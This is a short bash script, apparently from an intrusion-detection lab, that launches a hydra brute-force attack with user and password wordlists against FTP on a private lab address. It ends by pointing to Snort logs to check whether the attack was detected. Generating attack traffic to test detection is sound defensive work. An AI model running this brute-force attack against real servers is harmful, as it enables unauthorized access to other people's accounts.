#!/bin/bash

TARGET_IP=${TARGET_IP:-192.168.100.10}
TARGET_PORT=21

echo "FTP Brute Force Attack"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Starting attack..."

# Ataque FTP
hydra -L /opt/attacks/wordlists/users.txt \
      -P /opt/attacks/wordlists/passwords.txt \
      -t 4 -vV -f \
      ftp://$TARGET_IP:$TARGET_PORT

echo "FTP attack completed. Check Snort logs for detection."